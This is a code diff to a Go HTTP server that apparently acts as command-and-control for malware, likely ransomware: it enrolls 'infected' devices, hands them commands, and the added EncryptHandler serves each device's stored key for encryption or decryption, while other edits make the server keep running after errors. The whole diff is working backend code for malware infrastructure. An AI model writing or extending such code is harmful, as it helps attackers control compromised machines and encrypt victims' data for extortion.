@@ -36,7 +36,7 @@ func HomeHandler(w http.ResponseWriter, r *http.Request) {
 	defaultMessage := []byte("Listening for incoming connections ")
 	_, err := w.Write(defaultMessage)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 }
 
@@ -46,7 +46,7 @@ func InfectedHandler(w http.ResponseWriter, r *http.Request) {
 
 	req, err := ioutil.ReadAll(r.Body)
 	if err != nil {
-		log.Fatalf("Issue getting enumeration data from device: %s", err)
+		log.Printf("Issue getting enumeration data from device: %s", err)
 	}
 	json.Unmarshal([]byte(req), &device)
 	log.Printf("Enrolled a new device: %s", device.ID)
@@ -102,6 +102,27 @@ func CommandHandler(w http.ResponseWriter, r *http.Request) {
 		command := []byte("Wait")
 		w.Write(command)
 	}
+}
+
+//Sends the private key to the host for encryption/decryption
+func EncryptHandler(w http.ResponseWriter, r *http.Request) {
+
+	//read the header of the request for device ID
+	ID := r.Header.Get("ID")
+
+	dbConnection, err := Connect() //connect to the database
+	if err != nil {
+		log.Println("Cannot connect to db ", err)
+	}
+
+	key, err := PrivateKey(dbConnection, ID)
+	if err != nil {
+		log.Printf("Error retrieiving key for device %s", ID)
+	}
+
+	command := []byte(key)
+	w.Write(command)
+
 }
 
 //generates an encryption key
